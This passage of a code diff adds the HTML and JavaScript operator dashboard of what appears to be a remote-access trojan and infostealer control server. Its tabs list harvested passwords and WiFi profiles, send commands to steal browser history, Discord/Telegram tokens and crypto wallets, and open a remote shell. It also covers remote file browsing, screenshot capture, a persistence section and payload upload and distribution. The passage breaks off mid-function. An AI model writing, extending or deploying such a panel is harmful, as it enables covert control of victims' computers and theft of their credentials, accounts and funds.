+                                registered</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Data Vault Tab -->
+                <div id="tab-vault" class="tab-content space-y-6">
+                    <div class="flex items-center justify-between">
+                        <div class="flex gap-2">
+                            <button onclick="loadVault('harvest')"
+                                class="px-4 py-2 bg-neutral-900 border border-neutral-800 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-neutral-800 transition-all">All
+                                Intelligence</button>
+                            <button onclick="loadVault('passwords')"
+                                class="px-4 py-2 bg-neutral-900 border border-neutral-800 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-neutral-800 transition-all text-neutral-500">Credentials</button>
+                            <button onclick="loadVault('wifi')"
+                                class="px-4 py-2 bg-neutral-900 border border-neutral-800 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-neutral-800 transition-all text-neutral-500">WiFi
+                                Profiles</button>
+                        </div>
+                        <div
+                            class="flex items-center gap-4 bg-neutral-900/40 p-1 rounded-lg border border-neutral-800 w-full max-w-xs">
+                            <i class="fas fa-filter text-neutral-600 ml-3 text-[10px]"></i>
+                            <input type="text" id="vault-search" placeholder="Search Vault..." onkeyup="filterVault()"
+                                class="bg-transparent border-none focus:ring-0 text-[10px] w-full py-1.5 placeholder-neutral-700 uppercase tracking-widest">
+                        </div>
+                    </div>
+                    <div class="card overflow-hidden">
+                        <table class="w-full text-left border-collapse">
+                            <thead>
+                                <tr class="bg-neutral-900/50 border-b border-neutral-900">
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Temporal Stamp</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Source Node</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Classification</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Data Payload</th>
+                                </tr>
+                            </thead>
+                            <tbody id="vault-table" class="divide-y divide-neutral-900/50">
+                                <tr>
+                                    <td colspan="4"
+                                        class="px-6 py-12 text-center text-[10px] text-neutral-600 uppercase tracking-[0.2em] italic">
+                                        Accessing encrypted archives...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Activity Log Tab -->
+                <div id="tab-activity" class="tab-content space-y-6">
+                    <div class="card overflow-hidden">
+                        <table class="w-full text-left border-collapse">
+                            <thead>
+                                <tr class="bg-neutral-900/50 border-b border-neutral-900">
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Time</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Event Protocol</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Origin</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Destination</th>
+                                </tr>
+                            </thead>
+                            <tbody id="activity-table" class="divide-y divide-neutral-900/50">
+                                <tr>
+                                    <td colspan="4"
+                                        class="px-6 py-12 text-center text-[10px] text-neutral-600 uppercase tracking-[0.2em] italic">
+                                        Retrieving telemetry logs...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Identity Hunter Tab -->
+                <div id="tab-identity" class="tab-content space-y-6">
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                        <div class="card p-6 border-l-2 border-l-blue-600">
+                            <div class="flex items-center justify-between mb-4">
+                                <h4 class="text-[10px] font-bold text-neutral-400 uppercase tracking-widest">Browser
+                                    Chronology</h4>
+                                <button onclick="sendCommand('get_browser_history')"
+                                    class="text-blue-500 hover:text-white transition-colors"><i
+                                        class="fas fa-sync-alt text-[10px]"></i></button>
+                            </div>
+                            <div class="space-y-3 max-h-48 overflow-y-auto scrollbar-thin pr-2" id="identity-history">
+                                <p class="text-[10px] text-neutral-700 italic">No telemetry data available</p>
+                            </div>
+                        </div>
+                        <div class="card p-6 border-l-2 border-l-purple-600">
+                            <div class="flex items-center justify-between mb-4">
+                                <h4 class="text-[10px] font-bold text-neutral-400 uppercase tracking-widest">
+                                    Communication Tokens</h4>
+                                <button onclick="sendCommand('get_discord_tokens')"
+                                    class="text-purple-500 hover:text-white transition-colors"><i
+                                        class="fas fa-sync-alt text-[10px]"></i></button>
+                            </div>
+                            <div class="space-y-3 max-h-48 overflow-y-auto scrollbar-thin pr-2" id="identity-tokens">
+                                <p class="text-[10px] text-neutral-700 italic">Scan for Discord/Telegram sessions...</p>
+                            </div>
+                        </div>
+                        <div class="card p-6 border-l-2 border-l-amber-600">
+                            <div class="flex items-center justify-between mb-4">
+                                <h4 class="text-[10px] font-bold text-neutral-400 uppercase tracking-widest">Crypto
+                                    Assets</h4>
+                                <button onclick="sendCommand('scan_wallets')"
+                                    class="text-amber-500 hover:text-white transition-colors"><i
+                                        class="fas fa-sync-alt text-[10px]"></i></button>
+                            </div>
+                            <div class="space-y-3 max-h-48 overflow-y-auto scrollbar-thin pr-2" id="identity-wallets">
+                                <p class="text-[10px] text-neutral-700 italic">Awaiting wallet discovery...</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Blacklist Tab -->
+                <div id="tab-blacklist" class="tab-content space-y-6">
+                    <div class="card overflow-hidden border border-red-900/20">
+                        <table class="w-full text-left border-collapse">
+                            <thead>
+                                <tr class="bg-red-950/5 border-b border-neutral-900">
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Hardware Identifier</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Reason for Exclusion</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Termination Date</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Access Control</th>
+                                </tr>
+                            </thead>
+                            <tbody id="blacklist-table" class="divide-y divide-neutral-900/50">
+                                <tr>
+                                    <td colspan="4"
+                                        class="px-6 py-12 text-center text-[10px] text-neutral-600 uppercase tracking-[0.2em] italic">
+                                        Loading exclusion zones...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Live Terminal Tab -->
+                <div id="tab-terminal" class="tab-content space-y-6">
+                    <div class="card overflow-hidden bg-black border-neutral-900">
+                        <div
+                            class="px-6 py-4 bg-neutral-900/20 border-b border-neutral-900 flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <div class="w-2 h-2 bg-green-500 rounded-full"></div>
+                                <h3 class="text-[10px] font-bold uppercase tracking-widest text-neutral-400">Live Secure
+                                    Tunnel</h3>
+                            </div>
+                            <select id="terminal-device"
+                                class="bg-transparent border-none focus:ring-0 text-[10px] uppercase tracking-widest text-blue-500 font-bold">
+                                <option value="">Select Node</option>
+                            </select>
+                        </div>
+                        <div id="terminal-output"
+                            class="p-6 h-[500px] overflow-y-auto font-mono text-xs leading-relaxed scrollbar-thin">
+                            <div class="text-neutral-700 uppercase tracking-widest text-[9px] mb-4">Initialising
+                                encrypted connection...</div>
+                        </div>
+                        <div class="p-4 bg-neutral-950 border-t border-neutral-900 flex items-center gap-4">
+                            <span class="text-blue-500 font-mono text-xs ml-2">>>></span>
+                            <input type="text" id="terminal-input" placeholder="Enter shell sequence..."
+                                onkeypress="if(event.key==='Enter')runTerminalCommand()"
+                                class="bg-transparent border-none focus:ring-0 text-xs w-full p-0 font-mono placeholder-neutral-800">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- File Manager Tab -->
+                <div id="tab-files" class="tab-content space-y-6">
+                    <div class="card overflow-hidden">
+                        <div
+                            class="px-6 py-4 bg-neutral-900/20 border-b border-neutral-900 flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <i class="fas fa-folder-open text-neutral-500 text-xs"></i>
+                                <h3 class="text-[10px] font-bold uppercase tracking-widest text-neutral-400">Remote File
+                                    System</h3>
+                            </div>
+                            <div class="flex gap-4">
+                                <select id="file-device"
+                                    class="bg-transparent border-none focus:ring-0 text-[10px] uppercase tracking-widest text-blue-500 font-bold">
+                                    <option value="">Select Node</option>
+                                </select>
+                                <button onclick="browseFiles('/')"
+                                    class="text-neutral-500 hover:text-white transition-colors"><i
+                                        class="fas fa-sync-alt text-xs"></i></button>
+                            </div>
+                        </div>
+                        <div class="p-4 bg-neutral-900/40 border-b border-neutral-900 flex items-center gap-3">
+                            <span class="text-neutral-600 text-[10px] font-mono">PATH:</span>
+                            <input type="text" id="file-path" value="C:\"
+                                class="bg-transparent border-none focus:ring-0 text-[10px] w-full p-0 font-mono text-neutral-300">
+                            <button onclick="browseFiles(document.getElementById('file-path').value)"
+                                class="px-3 py-1 bg-neutral-800 rounded text-[9px] uppercase font-bold tracking-widest">Navigate</button>
+                        </div>
+                        <div id="file-list"
+                            class="divide-y divide-neutral-900/50 max-h-[500px] overflow-y-auto scrollbar-thin">
+                            <div class="px-6 py-20 text-center">
+                                <p class="text-[10px] text-neutral-700 uppercase tracking-[0.2em]">Select a node to
+                                    browse directory structure</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Screenshots Tab -->
+                <div id="tab-screenshots" class="tab-content space-y-6">
+                    <div class="flex items-center justify-between">
+                        <div>
+                            <h3 class="text-lg font-bold tracking-tight">Visual Intelligence</h3>
+                            <p class="text-[10px] text-neutral-600 uppercase tracking-widest">Recent captures from
+                                connected nodes</p>
+                        </div>
+                        <div class="flex gap-4">
+                            <select id="screenshot-device"
+                                class="bg-neutral-900 border border-neutral-800 rounded px-4 py-2 text-[10px] uppercase tracking-widest font-bold">
+                                <option value="">All Nodes</option>
+                            </select>
+                            <button onclick="captureAllScreenshots()"
+                                class="px-5 py-2 bg-blue-600 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-blue-500 transition-all">Capture
+                                All</button>
+                        </div>
+                    </div>
+                    <div id="screenshot-gallery"
+                        class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
+                        <div class="card p-20 text-center col-span-full border-dashed border-neutral-800">
+                            <p class="text-[10px] text-neutral-700 uppercase tracking-[0.2em]">No visual telemetry
+                                acquired</p>
+                        </div>
+                    </div>
+                </div>
+
+
+                <!-- Settings Tab -->
+                <div id="tab-settings" class="tab-content space-y-8">
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                        <div class="card">
+                            <div class="px-8 py-6 border-b border-neutral-900">
+                                <h3 class="text-[10px] font-bold uppercase tracking-widest text-neutral-400">Safety &
+                                    Compliance</h3>
+                            </div>
+                            <div class="p-8 space-y-6">
+                                <div
+                                    class="flex items-center justify-between p-6 bg-red-950/10 rounded border border-red-900/30">
+                                    <div>
+                                        <h4 class="text-sm font-bold text-red-500 uppercase tracking-tighter">Global
+                                            Kill Switch</h4>
+                                        <p class="text-[10px] text-neutral-500 uppercase tracking-widest mt-1">
+                                            Disconnect all nodes and halt ingress</p>
+                                    </div>
+                                    <label class="relative inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" id="kill-switch-settings"
+                                            onchange="toggleKillSwitch(this.checked)" class="sr-only peer">
+                                        <div
+                                            class="w-12 h-6 bg-neutral-800 rounded-full peer peer-checked:bg-red-600 transition-all after:content-[''] after:absolute after:top-1 after:left-1 after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:after:translate-x-6">
+                                        </div>
+                                    </label>
+                                </div>
+
+                                <button onclick="cleanDatabase()"
+                                    class="w-full flex items-center justify-between p-6 bg-neutral-900/40 rounded border border-neutral-800 hover:bg-neutral-800 transition-all group">
+                                    <div class="text-left">
+                                        <h4
+                                            class="text-sm font-bold uppercase tracking-tighter group-hover:text-blue-500 transition-colors">
+                                            Telemetry Purge</h4>
+                                        <p class="text-[10px] text-neutral-500 uppercase tracking-widest mt-1">Clear
+                                            event history older than 7 cycles</p>
+                                    </div>
+                                    <i
+                                        class="fas fa-trash-alt text-neutral-700 group-hover:text-red-500 transition-colors"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="card">
+                            <div class="px-8 py-6 border-b border-neutral-900">
+                                <h3 class="text-[10px] font-bold uppercase tracking-widest text-neutral-400">Environment
+                                    Diagnostics</h3>
+                            </div>
+                            <div class="p-8 space-y-4">
+                                <div class="flex justify-between items-center py-2 border-b border-neutral-900/50">
+                                    <span class="text-[10px] text-neutral-500 uppercase tracking-widest">Memory
+                                        Allocation</span>
+                                    <span class="info-ram font-mono text-xs text-blue-500">--</span>
+                                </div>
+                                <div class="flex justify-between items-center py-2 border-b border-neutral-900/50">
+                                    <span class="text-[10px] text-neutral-500 uppercase tracking-widest">Processor
+                                        Load</span>
+                                    <span class="info-cpu font-mono text-xs text-blue-500">--</span>
+                                </div>
+                                <div class="flex justify-between items-center py-2 border-b border-neutral-900/50">
+                                    <span class="text-[10px] text-neutral-500 uppercase tracking-widest">Active
+                                        Consoles</span>
+                                    <span id="info-dashboards" class="font-mono text-xs text-blue-500">--</span>
+                                </div>
+                                <div class="flex justify-between items-center py-2">
+                                    <span class="text-[10px] text-neutral-500 uppercase tracking-widest">System
+                                        Lifetime</span>
+                                    <span id="info-uptime" class="font-mono text-xs text-blue-500">--</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Toast Container -->
+    <div id="toast-container" class="fixed bottom-4 right-4 space-y-2 z-50"></div>
+
+    <script>
+        let authToken = localStorage.getItem('hdex_token') || '';
+        let devices = [];
+        let currentTab = 'dashboard';
+        let selectedDeviceId = null;
+
+        // --- AUTHENTICATION ---
+        async function authenticate() {
+            const tokenInput = document.getElementById('token-input');
+            const token = tokenInput.value;
+            if (!token) return showToast('TOKEN REQUIRED', 'error');
+
+            const res = await fetch('/stats?token=' + token);
+            if (res.status === 200) {
+                authToken = token;
+                localStorage.setItem('hdex_token', token);
+                document.getElementById('login-modal').classList.add('hidden');
+                document.getElementById('main-app').classList.remove('hidden');
+                initApp();
+            } else {
+                showToast('ACCESS DENIED: INVALID TOKEN', 'error');
+            }
+        }
+
+        function logout() {
+            localStorage.removeItem('hdex_token');
+            location.reload();
+        }
+
+        // --- INITIALIZATION ---
+        async function initApp() {
+            await refreshAll();
+            connectWebSocket();
+            setInterval(refreshAll, 60000);
+        }
+
+        async function refreshAll() {
+            await loadStats();
+            await loadDevices();
+            await loadActivity();
+            if (currentTab === 'payloads') loadPayloads();
+        }
+
+        // --- CORE DATA LOADING ---
+        async function loadStats() {
+            try {
+                const res = await fetch('/stats?token=' + authToken);
+                if (res.status !== 200) return;
+                const stats = await res.json();
+
+                // Dashboard Stats
+                const devStat = document.getElementById('stat-devices');
+                if (devStat) devStat.textContent = stats.active_clients;
+                const msgStat = document.getElementById('stat-messages');
+                if (msgStat) msgStat.textContent = stats.total_messages;
+                const peakStat = document.getElementById('stat-peak');
+                if (peakStat) peakStat.textContent = stats.peak_clients;
+                const dbStat = document.getElementById('stat-db');
+                if (dbStat) dbStat.textContent = stats.db_size;
+
+                // Connection Label
+                const uptimeEl = document.getElementById('server-uptime');
+                if (uptimeEl) uptimeEl.textContent = stats.uptime.split('.')[0];
+
+                // Settings Stats (Classes for duplicates)
+                document.querySelectorAll('.info-ram').forEach(el => el.textContent = stats.ram_usage);
+                document.querySelectorAll('.info-cpu').forEach(el => el.textContent = stats.cpu_percent + '%');
+
+                const dashInfo = document.getElementById('info-dashboards');
+                if (dashInfo) dashInfo.textContent = stats.active_dashboards;
+                const lifeInfo = document.getElementById('info-uptime');
+                if (lifeInfo) lifeInfo.textContent = stats.uptime.split('.')[0];
+
+                // Kill Switch State
+                const ksDash = document.getElementById('kill-switch-dash');
+                if (ksDash) ksDash.checked = stats.is_kill_switch_on;
+                const ksSet = document.getElementById('kill-switch-settings');
+                if (ksSet) ksSet.checked = stats.is_kill_switch_on;
+            } catch (e) {
+                console.error("Stats load failed", e);
+            }
+        }
+
+        async function loadDevices() {
+            try {
+                const res = await fetch('/manage/devices?token=' + authToken);
+                if (res.status !== 200) return;
+                const data = await res.json();
+                devices = data;
+
+                updateDevicesUI();
+            } catch (e) {
+                console.error("Devices load failed", e);
+            }
+        }
+
+        function updateDevicesUI() {
+            const list = document.getElementById('devices-list');
+            const preview = document.getElementById('devices-preview');
+
+            const html = devices.length ? devices.map(d => `
+                <div class="card p-5 cursor-pointer group transition-all duration-300 ${selectedDeviceId === d.id ? 'border-blue-600 bg-blue-600/5' : 'hover:border-neutral-700'}" 
+                    onclick="selectDevice('${d.id}')">
+                    <div class="flex items-start justify-between mb-4">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 bg-neutral-900 rounded flex items-center justify-center border border-neutral-800 group-hover:border-blue-500/50 transition-colors">
+                                <i class="fab fa-${d.os?.toLowerCase().includes('win') ? 'windows text-blue-500' : 'linux text-neutral-400'} text-lg"></i>
+                            </div>
+                            <div>
+                                <h4 class="text-xs font-bold uppercase tracking-tight truncate w-32">${d.name || 'ANONYMOUS-NODE'}</h4>
+                                <p class="text-[9px] text-neutral-600 font-mono mt-0.5">${d.id}</p>
+                            </div>
+                        </div>
+                        <div class="flex flex-col items-end gap-1.5">
+                            <span class="w-1.5 h-1.5 ${d.status === 'Online' ? 'bg-blue-500 shadow-[0_0_8px_rgba(59,130,246,0.5)]' : 'bg-neutral-800'} rounded-full"></span>
+                            <span class="text-[8px] text-neutral-700 font-bold uppercase tracking-widest">${d.status === 'Online' ? 'Active' : 'Dark'}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="flex items-center justify-between mt-auto">
+                        <div class="flex items-center gap-3">
+                            <div class="flex flex-col">
+                                <span class="text-[8px] text-neutral-600 uppercase tracking-widest leading-none mb-1">Network Address</span>
+                                <span class="text-[10px] text-neutral-400 font-mono">${d.ip || '0.0.0.0'}</span>
+                            </div>
+                        </div>
+                        <div class="flex gap-1 opactiy-0 group-hover:opacity-100 transition-opacity">
+                            <button onclick="event.stopPropagation(); banDevice('${d.id}')" class="p-2 hover:bg-red-500/10 rounded group/btn" title="Exclusion">
+                                <i class="fas fa-ban text-[10px] text-neutral-700 group-hover/btn:text-red-500 transition-colors"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `).join('') : `
+                <div class="card p-12 text-center col-span-full border-dashed border-neutral-800">
+                     <p class="text-[10px] text-neutral-600 uppercase tracking-[0.2em]">Awaiting inbound telemetry...</p>
+                </div>
+            `;
+
+            list.innerHTML = html;
+            if (preview) preview.innerHTML = html;
+
+            // Update Selectors
+            updateTerminalDevices();
+            updateFileDevices();
+            updateScreenshotDevices();
+        }
+
+        // --- ACTIVITY LOG ---
+        async function loadActivity() {
+            try {
+                const res = await fetch('/vault?type=events&limit=50&token=' + authToken);
+                if (res.status !== 200) return;
+                const data = await res.json();
+
+                // Sidebar/Dashboard Feed
+                const recentHtml = data.data.slice(0, 5).map(e => `
+                    <div class="activity-item pl-3 py-2 border-l border-neutral-800">
+                        <p class="text-[10px] uppercase font-bold text-neutral-400 tracking-tight">${e.type}</p>
+                        <p class="text-[8px] text-neutral-600 font-mono mt-0.5">${new Date(e.timestamp).toLocaleTimeString()}</p>
+                    </div>
+                `).join('') || '<p class="text-[9px] text-neutral-700 uppercase p-4 italic">No telemetry recorded</p>';
+
+                const recentActivity = document.getElementById('recent-activity');
+                if (recentActivity) recentActivity.innerHTML = recentHtml;
+
+                // Table View
+                const tableHtml = data.data.map(e => `
+                    <tr class="hover:bg-neutral-900/40 transition-colors border-b border-neutral-900/30">
+                        <td class="px-6 py-4 text-[10px] font-mono text-neutral-500">${new Date(e.timestamp).toLocaleString()}</td>
+                        <td class="px-6 py-4">
+                            <span class="px-2 py-0.5 bg-blue-500/10 text-blue-500 rounded text-[9px] font-bold uppercase tracking-widest border border-blue-500/20">${e.type}</span>
+                        </td>
+                        <td class="px-6 py-4 text-[10px] font-mono text-neutral-400">${e.sender_id || 'SERVER'}</td>
+                        <td class="px-6 py-4 text-[10px] font-mono text-neutral-400">${e.target_id || 'BROADCAST'}</td>
+                    </tr>
+                `).join('') || '<tr><td colspan="4" class="px-6 py-12 text-center text-[10px] text-neutral-600 uppercase italic">Telemetry buffer empty</td></tr>';
+
+                const activityTable = document.getElementById('activity-table');
+                if (activityTable) activityTable.innerHTML = tableHtml;
+
+                // Update Badge
+                const clientsCount = document.getElementById('sidebar-clients');
+                const navCount = document.getElementById('nav-device-count');
+                if (clientsCount) clientsCount.textContent = devices.length;
+                if (navCount) navCount.textContent = devices.length;
+            } catch (e) {
+                console.error("Activity load failed", e);
+            }
+        }
+
+        // --- DATA VAULT ---
+        async function loadVault(filter = 'harvest') {
+            try {
+                const res = await fetch(`/vault?type=${filter}&limit=100&token=${authToken}`);
+                if (res.status !== 200) return;
+                const data = await res.json();
+
+                const tableHtml = data.data.map(r => `
+                    <tr class="hover:bg-neutral-900/40 transition-colors border-b border-neutral-900/30">
+                        <td class="px-6 py-4 text-[10px] font-mono text-neutral-500">${new Date(r.timestamp).toLocaleString()}</td>
+                        <td class="px-6 py-4 text-[10px] font-mono text-blue-500 font-bold">${r.client_id}</td>
+                        <td class="px-6 py-4">
+                            <span class="px-2 py-0.5 bg-neutral-900 text-neutral-400 rounded text-[9px] font-bold uppercase tracking-widest border border-neutral-800">${r.type}</span>
+                        </td>
+                        <td class="px-6 py-4">
+                            <div class="text-[10px] text-neutral-400 font-mono truncate max-w-lg bg-neutral-950 p-2 rounded border border-neutral-900 cursor-help" onclick="alert(this.textContent)">${r.content || 'NO-DATA'}</div>
+                        </td>
+                    </tr>
+                `).join('') || '<tr><td colspan="4" class="px-6 py-12 text-center text-[10px] text-neutral-600 uppercase italic">No intelligence items in archive</td></tr>';
+
+                document.getElementById('vault-table').innerHTML = tableHtml;
+            } catch (e) {
+                console.error("Vault load failed", e);
+            }
+        }
+
+        // --- EXCLUSION LIST (BLACKLIST) ---
+        async function loadBlacklist() {
+            try {
+                const res = await fetch('/manage/blacklist?token=' + authToken);
+                if (res.status !== 200) return;
+                const data = await res.json();
+
+                const tableHtml = data.map(b => `
+                    <tr class="hover:bg-red-950/5 transition-colors border-b border-neutral-900/30">
+                        <td class="px-6 py-4 text-[10px] font-mono text-red-500 font-bold tracking-tighter">${b.id}</td>
+                        <td class="px-6 py-4 text-[10px] text-neutral-500 uppercase tracking-widest">${b.reason || 'POLICY VIOLATION'}</td>
+                        <td class="px-6 py-4 text-[10px] font-mono text-neutral-600">${new Date(b.time).toLocaleString()}</td>
+                        <td class="px-6 py-4">
+                            <button onclick="unbanDevice('${b.id}')" class="text-[9px] font-bold uppercase tracking-widest text-blue-500 hover:text-blue-400 transition-colors">AUTHORISE</button>
+                        </td>
+                    </tr>
+                `).join('') || '<tr><td colspan="4" class="px-6 py-12 text-center text-[10px] text-neutral-600 uppercase italic">Security exclusion list empty</td></tr>';
+
+                document.getElementById('blacklist-table').innerHTML = tableHtml;
+            } catch (e) {
+                console.error("Blacklist load failed", e);
+            }
+        }
+
+        // --- PAYLOAD MANAGER ---
+        async function loadPayloads() {
+            try {
+                const res = await fetch('/manage/payloads?token=' + authToken);
+                if (res.status !== 200) return;
+                const payloads = await res.json();
+
+                const html = payloads.length ? payloads.map(p => `
+                    <div class="card p-6 group hover:border-blue-600/50 transition-all duration-300">
+                        <div class="flex items-start justify-between mb-4">
+                            <div class="w-10 h-10 bg-neutral-900 rounded border border-neutral-800 flex items-center justify-center">
+                                <i class="fas fa-box text-blue-500 text-sm"></i>
+                            </div>
+                            <div class="flex flex-col items-end">
+                                <span class="text-[9px] text-neutral-600 font-bold uppercase tracking-widest">Downloads</span>
+                                <span class="text-xs font-mono text-neutral-400">${p.downloads}</span>
+                            </div>
+                        </div>
+                        <h4 class="text-sm font-bold uppercase tracking-tighter mb-1">${p.name}</h4>
+                        <p class="text-[9px] text-neutral-500 uppercase tracking-widest leading-relaxed mb-4">${p.description || 'No asset description available'}</p>
+                        
+                        <div class="flex items-center justify-between pt-4 border-t border-neutral-900">
+                             <span class="text-[9px] font-mono text-neutral-700 uppercase tracking-tighter">${p.filename}</span>
+                             <div class="flex gap-2">
+                                <a href="/dl/${p.name}" class="p-2 hover:bg-blue-600/10 rounded transition-colors" title="Download Reference">
+                                    <i class="fas fa-download text-[10px] text-blue-500"></i>
+                                </a>
+                                <button onclick="deletePayload('${p.name}')" class="p-2 hover:bg-red-600/10 rounded transition-colors" title="Purge Artifact">
+                                    <i class="fas fa-trash-alt text-[10px] text-red-500"></i>
+                                </button>
+                             </div>
+                        </div>
+                    </div>
+                `).join('') : `
+                    <div class="card p-12 text-center col-span-full border-dashed border-neutral-800">
+                         <i class="fas fa-box-open text-3xl text-neutral-800 mb-4"></i>
+                         <p class="text-[10px] text-neutral-600 uppercase tracking-[0.2em]">No deployment assets registered</p>
+                    </div>
+                `;
+
+                document.getElementById('payload-list').innerHTML = html;
+            } catch (e) { console.error(e); }
+        }
+
+        async function uploadPayload(input) {
+            const file = input.files[0];
+            if (!file) return;
+
+            const name = prompt("ARTIFACT ALIAS (Internal Name):", file.name.split('.')[0]);
+            const desc = prompt("SPECIFICATION/DESCRIPTION:", "Remote Management Module");
+            if (!name) return;
+
+            const formData = new FormData();
+            formData.append('file', file);
+
+            showToast("INITIATING ARTIFACT UPLOAD...", "info");
+
+            try {
+                // First upload the file
+                const uploadRes = await fetch(`/manage/payload/upload?token=${authToken}`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const uploadData = await uploadRes.json();
+                if (uploadRes.status !== 200) throw new Error(uploadData.error);
+
+                // Then register it
+                await fetch(`/manage/payload/register?token=${authToken}&name=${encodeURIComponent(name)}&filename=${encodeURIComponent(uploadData.filename)}&description=${encodeURIComponent(desc)}`, {
+                    method: 'POST'
+                });
+
+                showToast("ARTIFACT SUCCESSFULLY REGISTERED", "success");
+                loadPayloads();
+            } catch (e) {
+                showToast("UPLOAD SEQUENCE FAILED: " + e.message, "error");
+            }
+            input.value = '';
+        }
+
+        async function deletePayload(name) {
+            if (!confirm(`Purge artifact '${name}' from archives?`)) return;
+            try {
+                const res = await fetch(`/manage/payload/${name}?token=${authToken}`, { method: 'DELETE' });
+                if (res.status === 200) {
+                    showToast("ARTIFACT PURGED", "success");
+                    loadPayloads();
+                }
+            } catch (e) { showToast("PURGE FAILED", "error"); }
+        }
+
+        // --- TAB NAVIGATION ---
+        function switchTab(tab, deviceId = null) {
+            currentTab = tab;
+            if (deviceId) {
+                selectedDeviceId = deviceId;
+                updateDevicesUI();
+            }
+
+            // UI States
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => {
+                n.classList.remove('active');
+                if (n.getAttribute('data-tab') === tab) n.classList.add('active');
+            });
+
+            const targetTab = document.getElementById('tab-' + tab);
+            if (targetTab) targetTab.classList.add('active');
+
+            const titles = {
+                dashboard: ['CENTRAL COMMAND', 'Real-time infrastructure intelligence'],
+                devices: ['FLEET PROTOCOL', 'Managed node enumeration and control'],
+                payloads: ['DEPOT MANAGER', 'Artifact distribution and logistics'],
+                terminal: ['SECURE TUNNEL', 'Encrypted shell access to remote environments'],
+                files: ['REMOTE ARCHIVE', 'Direct filesystem navigation'],
+                screenshots: ['VISUAL TELEMETRY', 'Remote environment imaging'],
+                vault: ['INTEL VAULT', 'Decrypted harvested credentials'],
+                activity: ['EVENT TELEMETRY', 'System-wide event auditing'],
+                blacklist: ['EXCLUSION ZONE', 'Policy-based hardware restriction'],
+                settings: ['ENVIRONMENT CFG', 'Core infrastructure configuration'],
+                processes: ['REMOTE TASKMGR', 'Active process enumeration and control'],
+                services: ['SERVICE MANAGER', 'Remote system service architecture'],
+                startup: ['PERSISTENCE DEPOT', 'Auto-launch and startup enumeration'],
+                identity: ['IDENTITY HUNTER', 'Deep intelligence recovery from browser/social']
+            };
+
+            document.getElementById('page-title').textContent = titles[tab][0];
+            document.getElementById('page-subtitle').textContent = titles[tab][1];
+
+            // Breadcrumbs
+            const bc = document.getElementById('breadcrumb');
+            if (deviceId || selectedDeviceId) {
+                bc.classList.remove('hidden');
+                document.getElementById('breadcrumb-node').textContent = deviceId || selectedDeviceId;
+            } else {
+                bc.classList.add('hidden');
+            }
+
+            // Tab specific loads
+            if (tab === 'vault') loadVault();
+            if (tab === 'blacklist') loadBlacklist();
+            if (tab === 'payloads') loadPayloads();
+            if (tab === 'processes') {
+                if (selectedDeviceId) {
+                    document.getElementById('current-process-node').textContent = selectedDeviceId;
+                    loadProcesses();
+                } else {
+                    document.getElementById('current-process-node').textContent = "SELECT A NODE";
+                    document.getElementById('process-table').innerHTML = `
+                        <tr>
+                            <td colspan="3" class="px-6 py-12 text-center text-[10px] text-neutral-600 uppercase tracking-[0.2em] italic">
+                                SELECT A DEVICE FROM THE FLEET TAB TO ENUMERATE PROCESSES</td>
+                        </tr>`;
+                }
+            }
+            if (tab === 'services' && selectedDeviceId) loadServices();
+            if (tab === 'startup' && selectedDeviceId) loadStartup();
+            if (tab === 'identity' && selectedDeviceId) {
+                // Initial loads for identity
+                showToast("NODE IDENTITY SCAN IN PROGRESS...", "info");
+            }
+            if (tab === 'terminal') updateTerminalDevices();
+            if (tab === 'files') updateFileDevices();
+            if (tab === 'screenshots') updateScreenshotDevices();
+        }
+
+        // --- COMMAND & CONTROL ---
+        function selectDevice(id) {
+            if (selectedDeviceId === id) {
+                deselectDevice();
+                return;
+            }
+            selectedDeviceId = id;
